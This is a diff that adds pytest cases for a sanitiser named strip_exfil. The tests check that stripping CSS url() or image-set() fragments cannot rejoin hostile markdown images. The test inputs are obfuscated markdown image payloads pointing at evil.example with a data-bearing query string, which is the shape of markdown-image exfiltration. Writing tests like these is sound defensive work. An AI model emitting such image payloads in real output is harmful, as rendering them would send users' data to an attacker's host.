@@ -155,6 +155,26 @@ def test_no_html_tag_survives_however_it_hides(form):
     assert out.startswith("앞 ") and out.endswith(" 뒤")
 
 
+JOINED_BY_CSS_OR_DEFINITIONS = [
+    "!url(https://evil.example/u)[a]url(https://evil.example/v)(https://evil.example/x?d=S)",
+    "!url(https://evil.example/u)[a][r]\n\n> [r]: https://evil.example/x?d=S",
+    "!image-set(https://evil.example/u)[r]\n\n> [r]: https://evil.example/x?d=S",
+]
+
+
+@pytest.mark.parametrize("form", JOINED_BY_CSS_OR_DEFINITIONS)
+def test_removing_a_css_url_cannot_join_an_image(form):
+    out = strip_exfil(form, "")
+
+    assert "![" not in out
+
+
+def test_removing_a_css_url_after_the_last_round_cannot_join_an_image():
+    hostile = "!" + "<" * 8 + "x>" * 8 + "url(https://evil.example/u)[a][r]\n\n> [r]: https://evil.example/x?d=S"
+
+    assert "![" not in strip_exfil(hostile, "")
+
+
 @pytest.mark.parametrize("layers", [7, 8, 9, 20])
 def test_layers_deeper_than_the_rounds_still_lose_the_image(layers):
     hostile = "!" + "<" * layers + "x>" * layers + "[a][r]\n\n> [r]: https://evil.example/x?d=S"
